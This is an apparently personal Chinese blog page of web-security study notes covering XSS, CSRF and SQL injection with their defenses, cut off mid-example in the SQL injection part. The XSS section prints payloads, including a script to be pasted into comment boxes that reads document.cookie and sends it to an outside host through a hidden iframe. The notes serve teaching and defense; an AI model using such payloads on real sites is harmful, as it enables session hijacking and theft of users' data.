<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>一、XSS攻击 | niping</title>
    <meta name="description" content="欢迎来到我的博客">
    <link rel="icon" href="/logo.jpg">
    
    <link rel="preload" href="/assets/css/0.styles.b8bd58f1.css" as="style"><link rel="preload" href="/assets/js/app.94458972.js" as="script"><link rel="preload" href="/assets/js/17.e582d86b.js" as="script"><link rel="prefetch" href="/assets/js/10.022221b0.js"><link rel="prefetch" href="/assets/js/11.fc523ee9.js"><link rel="prefetch" href="/assets/js/12.8aac1225.js"><link rel="prefetch" href="/assets/js/13.de4a9223.js"><link rel="prefetch" href="/assets/js/14.23a5eb15.js"><link rel="prefetch" href="/assets/js/15.aebfc83f.js"><link rel="prefetch" href="/assets/js/16.4c110118.js"><link rel="prefetch" href="/assets/js/18.a0156111.js"><link rel="prefetch" href="/assets/js/19.c5ff1d09.js"><link rel="prefetch" href="/assets/js/2.39da4197.js"><link rel="prefetch" href="/assets/js/20.b76c743f.js"><link rel="prefetch" href="/assets/js/21.7ad4eab9.js"><link rel="prefetch" href="/assets/js/22.16fda33d.js"><link rel="prefetch" href="/assets/js/23.342195e7.js"><link rel="prefetch" href="/assets/js/24.5aa85fd8.js"><link rel="prefetch" href="/assets/js/25.d8c50d13.js"><link rel="prefetch" href="/assets/js/26.15435dd7.js"><link rel="prefetch" href="/assets/js/27.d05e43fa.js"><link rel="prefetch" href="/assets/js/28.33b3a9a8.js"><link rel="prefetch" href="/assets/js/29.0b2a57af.js"><link rel="prefetch" href="/assets/js/3.82a05358.js"><link rel="prefetch" href="/assets/js/30.92eafdd8.js"><link rel="prefetch" href="/assets/js/31.f9b97bef.js"><link rel="prefetch" href="/assets/js/32.aa710ab7.js"><link rel="prefetch" href="/assets/js/33.0a258d82.js"><link rel="prefetch" href="/assets/js/34.80d4e93d.js"><link rel="prefetch" href="/assets/js/35.92138a40.js"><link rel="prefetch" href="/assets/js/36.17b76158.js"><link rel="prefetch" href="/assets/js/37.5d26efa4.js"><link rel="prefetch" href="/assets/js/38.fb3a3bde.js"><link rel="prefetch" href="/assets/js/39.605aa7cd.js"><link rel="prefetch" href="/assets/js/4.55ec9502.js"><link rel="prefetch" href="/assets/js/40.8af9ba6c.js"><link rel="prefetch" href="/assets/js/41.24b1b90c.js"><link rel="prefetch" href="/assets/js/42.236656bc.js"><link rel="prefetch" href="/assets/js/43.6bfd5d66.js"><link rel="prefetch" href="/assets/js/44.3503f24d.js"><link rel="prefetch" href="/assets/js/45.d1d103cc.js"><link rel="prefetch" href="/assets/js/46.0438ca72.js"><link rel="prefetch" href="/assets/js/47.a2c951a3.js"><link rel="prefetch" href="/assets/js/48.c02469c3.js"><link rel="prefetch" href="/assets/js/49.0a70f746.js"><link rel="prefetch" href="/assets/js/5.3f24b2a3.js"><link rel="prefetch" href="/assets/js/50.8319cade.js"><link rel="prefetch" href="/assets/js/51.e7804183.js"><link rel="prefetch" href="/assets/js/52.a3fc1090.js"><link rel="prefetch" href="/assets/js/53.d3354adc.js"><link rel="prefetch" href="/assets/js/54.82390941.js"><link rel="prefetch" href="/assets/js/55.bd33628a.js"><link rel="prefetch" href="/assets/js/56.1bc63dd1.js"><link rel="prefetch" href="/assets/js/57.f549e64b.js"><link rel="prefetch" href="/assets/js/58.855c8e9b.js"><link rel="prefetch" href="/assets/js/59.27054138.js"><link rel="prefetch" href="/assets/js/6.7798442f.js"><link rel="prefetch" href="/assets/js/60.c24d3664.js"><link rel="prefetch" href="/assets/js/61.d796e188.js"><link rel="prefetch" href="/assets/js/62.ff218454.js"><link rel="prefetch" href="/assets/js/63.7a9275f5.js"><link rel="prefetch" href="/assets/js/64.ff254371.js"><link rel="prefetch" href="/assets/js/7.14b25646.js"><link rel="prefetch" href="/assets/js/8.fd27f6ea.js"><link rel="prefetch" href="/assets/js/9.fc8f6278.js">
    <link rel="stylesheet" href="/assets/css/0.styles.b8bd58f1.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">niping</span></a> <div class="links" style="max-width:nullpx;"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">HOME</a></div><div class="nav-item"><a href="/font/" class="nav-link router-link-active">前端</a></div><div class="nav-item"><a href="/computer/" class="nav-link">计算机</a></div><div class="nav-item"><a href="/other/" class="nav-link">个人学习笔记</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title">关于我</span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://www.instagram.com/nipingd/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  instagram
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://github.com/nipingd" target="_blank" rel="noopener noreferrer" class="nav-link external">
  github
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">HOME</a></div><div class="nav-item"><a href="/font/" class="nav-link router-link-active">前端</a></div><div class="nav-item"><a href="/computer/" class="nav-link">计算机</a></div><div class="nav-item"><a href="/other/" class="nav-link">个人学习笔记</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title">关于我</span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://www.instagram.com/nipingd/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  instagram
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://github.com/nipingd" target="_blank" rel="noopener noreferrer" class="nav-link external">
  github
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></div></div> <!----></nav>  <ul class="sidebar-links"><li><div class="sidebar-group first collapsable"><p class="sidebar-heading"><span>JS</span> <span class="arrow right"></span></p> <!----></div></li><li><div class="sidebar-group collapsable"><p class="sidebar-heading"><span>ES6</span> <span class="arrow right"></span></p> <!----></div></li><li><div class="sidebar-group collapsable"><p class="sidebar-heading open"><span>浏览器网络</span> <span class="arrow down"></span></p> <ul class="sidebar-group-items"><li><a href="/font/浏览器网络/URL到页面呈现过程总结.html" class="sidebar-link">URL到页面呈现过程总结</a></li><li><a href="/font/浏览器网络/Web安全.html" class="active sidebar-link">Web安全</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/font/浏览器网络/Web安全.html#一、xss攻击" class="sidebar-link">一、XSS攻击</a></li><li class="sidebar-sub-header"><a href="/font/浏览器网络/Web安全.html#二、csrf攻击" class="sidebar-link">二、CSRF攻击</a></li><li class="sidebar-sub-header"><a href="/font/浏览器网络/Web安全.html#三、sql注入" class="sidebar-link">三、SQL注入</a></li><li class="sidebar-sub-header"><a href="/font/浏览器网络/Web安全.html#四、xff注入" class="sidebar-link">四、XFF注入</a></li><li class="sidebar-sub-header"><a href="/font/浏览器网络/Web安全.html#五、不安全的直接对象引用" class="sidebar-link">五、不安全的直接对象引用</a></li><li class="sidebar-sub-header"><a href="/font/浏览器网络/Web安全.html#六、传输层保护不足" class="sidebar-link">六、传输层保护不足</a></li></ul></li><li><a href="/font/浏览器网络/Cookie、Session和Web Storage.html" class="sidebar-link">Cookie、Session和Web Storage</a></li><li><a href="/font/浏览器网络/跨域实现.html" class="sidebar-link">跨域实现</a></li><li><a href="/font/浏览器网络/浏览器缓存.html" class="sidebar-link">浏览器缓存</a></li><li><a href="/font/浏览器网络/页面性能优化.html" class="sidebar-link">页面性能优化</a></li><li><a href="/font/浏览器网络/网络基础.html" class="sidebar-link">网络基础</a></li><li><a href="/font/浏览器网络/前端路由.html" class="sidebar-link">前端路由</a></li><li><a href="/font/浏览器网络/chrome调试技巧.html" class="sidebar-link">chrome调试技巧</a></li></ul></div></li><li><div class="sidebar-group collapsable"><p class="sidebar-heading"><span>CSS</span> <span class="arrow right"></span></p> <!----></div></li><li><div class="sidebar-group collapsable"><p class="sidebar-heading"><span>vue</span> <span class="arrow right"></span></p> <!----></div></li><li><div class="sidebar-group collapsable"><p class="sidebar-heading"><span>node</span> <span class="arrow right"></span></p> <!----></div></li><li><div class="sidebar-group collapsable"><p class="sidebar-heading"><span>其他</span> <span class="arrow right"></span></p> <!----></div></li></ul> </div> <div class="page"> <div class="content"><h2 id="一、xss攻击"><a href="#一、xss攻击" aria-hidden="true" class="header-anchor">#</a> 一、XSS攻击</h2> <p><a href="https://link.juejin.im?target=https%3A%2F%2Fbaike.baidu.com%2Fitem%2F%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%2F8186208" target="_blank" rel="noopener noreferrer">跨站脚本攻击<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>(Cross Site Scripting)，为了不和<a href="https://link.juejin.im?target=https%3A%2F%2Fbaike.baidu.com%2Fitem%2F%E5%B1%82%E5%8F%A0%E6%A0%B7%E5%BC%8F%E8%A1%A8" target="_blank" rel="noopener noreferrer">层叠样式表<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>(Cascading Style Sheets, <a href="https://link.juejin.im?target=https%3A%2F%2Fbaike.baidu.com%2Fitem%2FCSS%2F5457" target="_blank" rel="noopener noreferrer">CSS<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意的Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p> <p><img src="/assets/img/1557991518526.23f6460e.png" alt="1557991518526"></p> <p><strong>特点：尽一切办法在目标网站上执行非目标网站上原有的脚本。</strong></p> <h3 id="xss危害"><a href="#xss危害" aria-hidden="true" class="header-anchor">#</a> XSS危害</h3> <ol><li>使用js或css破坏页面正常的结构与样式</li> <li>通过document.cookie盗取cookie，实现无密码访问</li> <li>流量劫持（通过访问某段具有window.location.href定位到其他页面）</li> <li>Dos攻击：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应。</li> <li>利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</li> <li>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li></ol> <h3 id="攻击方式"><a href="#攻击方式" aria-hidden="true" class="header-anchor">#</a> 攻击方式</h3> <h4 id="_1-reflected-xss（基于反射的xss攻击）"><a href="#_1-reflected-xss（基于反射的xss攻击）" aria-hidden="true" class="header-anchor">#</a> <strong>1. Reflected XSS（基于反射的XSS攻击）</strong></h4> <div class="tip custom-block"><p class="custom-block-title">TIP</p> <p>非持久型，反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p></div> <p>反射型 XSS 的攻击步骤：</p> <ul><li>攻击者构造出特殊的 URL，其中包含恶意代码。</li> <li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</li> <li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li> <li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ul> <p><img src="/assets/img/1557992407088.0d9e7a7e.png" alt="1557992407088"></p> <h4 id="_2-stored-xss（基于存储的xss攻击）"><a href="#_2-stored-xss（基于存储的xss攻击）" aria-hidden="true" class="header-anchor">#</a> <strong>2. Stored XSS（基于存储的XSS攻击）</strong></h4> <div class="tip custom-block"><p class="custom-block-title">持久型：</p> <p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p></div> <p>存储型 XSS 的攻击步骤：</p> <ul><li>攻击者将恶意代码提交到目标网站的数据库中。</li> <li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</li> <li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li> <li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ul> <p><img src="/assets/img/1557992492153.e2b1d18a.png" alt="1557992492153"></p> <h4 id="_3-dom-based-or-local-xss（基于dom或本地的xss攻击）"><a href="#_3-dom-based-or-local-xss（基于dom或本地的xss攻击）" aria-hidden="true" class="header-anchor">#</a> <strong>3. DOM-based or local XSS（基于DOM或本地的XSS攻击）</strong></h4> <div class="tip custom-block"><p class="custom-block-title">TIP</p> <p>一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。</p></div> <p>DOM 型 XSS 的攻击步骤：</p> <ul><li>攻击者构造出特殊的 URL，其中包含恶意代码。</li> <li>用户打开带有恶意代码的 URL。</li> <li>用户浏览器接收到响应后解析执行，前端  JavaScript 取出 URL 中的恶意代码并执行。</li> <li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ul> <p>简单案例</p> <p>使用xss弹出恶意警告框，代码为：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&quot;xss&quot;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>xss输入也可能是html代码段，如果使网页不停的刷新，代码为：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>refresh<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>0;<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>嵌入其他网站链接的代码为：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>http://www.jsay.org<span class="token punctuation">&quot;</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span>0</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span>0</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- jsay.org 个人小站还没开始运行哦！ --&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><code>JavaScript</code> 写一个请求跨站的脚本就是XSS了，如下：</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> jsay<span class="token punctuation">.</span>org 个人小站还没开始运行哦！ <span class="token operator">--</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 将此段代码放在评论<span class="token operator">/</span>留言框中提交 <span class="token operator">--</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">&quot;text/javascript&quot;</span><span class="token operator">&gt;</span>
  <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">window<span class="token punctuation">,</span> document</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// 构造泄露信息用的 URL</span>
      <span class="token keyword">var</span> cookies <span class="token operator">=</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span>
      <span class="token keyword">var</span> xssURIBase <span class="token operator">=</span> <span class="token string">&quot;http://www.jsay.org/xss/&quot;</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> xssURI <span class="token operator">=</span> xssURIBase <span class="token operator">+</span> window<span class="token punctuation">.</span><span class="token function">encodeURI</span><span class="token punctuation">(</span>cookies<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// 建立隐藏 iframe 用于通讯</span>
      <span class="token keyword">var</span> hideFrame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&quot;iframe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      hideFrame<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      hideFrame<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      hideFrame<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">&quot;none&quot;</span><span class="token punctuation">;</span>
      hideFrame<span class="token punctuation">.</span>src <span class="token operator">=</span> xssURI<span class="token punctuation">;</span>
      <span class="token comment">// 开工</span>
      document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>hideFrame<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h3 id="xss防御"><a href="#xss防御" aria-hidden="true" class="header-anchor">#</a> XSS防御</h3> <p><strong>思路：对输入(和URL参数)进行过滤，对输出进行编码。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的XSS攻击。</strong></p> <ol><li>对输入、URL参数等（如：<code>&lt;&gt;</code>、<code>/</code> 、<code>&amp;</code>、<code>'</code>、<code>&quot;</code> ）进行转义、<strong>过滤</strong>，仅接受指定长度范围内并符合我们期望格式的的内容提交，阻止或者忽略除此外的其他任何数据；</li> <li>输出数据之前对潜在的威胁的字符进行<strong>编码</strong>、转义；</li> <li>XSS 一般利用js脚步读取用户浏览器中的Cookie，而如果在服务器端对 Cookie 设置了HttpOnly 属性，那么js脚本就不能读取到cookie，但是浏览器还是能够正常使用cookie。</li> <li>设置黑、白名单；</li> <li><a href="https://link.juejin.im?target=http%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2016%2F09%2Fcsp.html" target="_blank" rel="noopener noreferrer">Content Security Policy<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。</li></ol> <h2 id="二、csrf攻击"><a href="#二、csrf攻击" aria-hidden="true" class="header-anchor">#</a> 二、CSRF攻击</h2> <div class="tip custom-block"><p class="custom-block-title">CSRF（Cross-site request forgery）跨站请求伪造：</p> <p>也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（<a href="https://link.juejin.im?target=https%3A%2F%2Fbaike.baidu.com%2Fitem%2FXSS" target="_blank" rel="noopener noreferrer">XSS<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户的请求来利用受信任的网站。与<a href="https://link.juejin.im?target=https%3A%2F%2Fbaike.baidu.com%2Fitem%2FXSS" target="_blank" rel="noopener noreferrer">XSS<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比<a href="https://link.juejin.im?target=https%3A%2F%2Fbaike.baidu.com%2Fitem%2FXSS" target="_blank" rel="noopener noreferrer">XSS<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>更具危险性。</p></div> <p><strong>本质原因：CSRF攻击是源于Web的隐式身份验证机制。Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。CSRF攻击的一般是由服务端解决。</strong></p> <p>CSRF攻击条件：</p> <ul><li><p>登录受信任网站A，并在本地生成Cookie。</p></li> <li><p>在不登出A的情况下，访问危险网站B。</p> <p><img src="/assets/img/1558012539913.57ac133a.png" alt="1558012539913"></p></li></ul> <p>虽然有些时候你访问B网站的时候，并没有访问A网站，但是你并不能保证之前登录过A网站的本地Cookie已过期，这个时候B网站一样是可以发起攻击。 CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！</p> <h3 id="csrf的防御"><a href="#csrf的防御" aria-hidden="true" class="header-anchor">#</a> CSRF的防御</h3> <ol><li>Cookie Hashing(所有表单都包含同一个伪随机值);</li> <li>验证码;</li> <li>One-Time Tokens(不同的表单包含一个不同的伪随机值);</li> <li><strong>Referer 验证</strong>:Referer 指的是页面请求来源。意思是，<strong>只接受本站的请求，服务器才做响应</strong>；如果不是，就拦截。</li></ol> <h2 id="三、sql注入"><a href="#三、sql注入" aria-hidden="true" class="header-anchor">#</a> 三、SQL注入</h2> <div class="tip custom-block"><p class="custom-block-title">TIP</p> <p>通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p></div> <h3 id="原理"><a href="#原理" aria-hidden="true" class="header-anchor">#</a> 原理</h3> <p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p> <p><strong>简单举例：</strong></p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// 前端给后端post键值对，登录的用户名和密码</span>
<span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token punctuation">{</span>
  username<span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span>
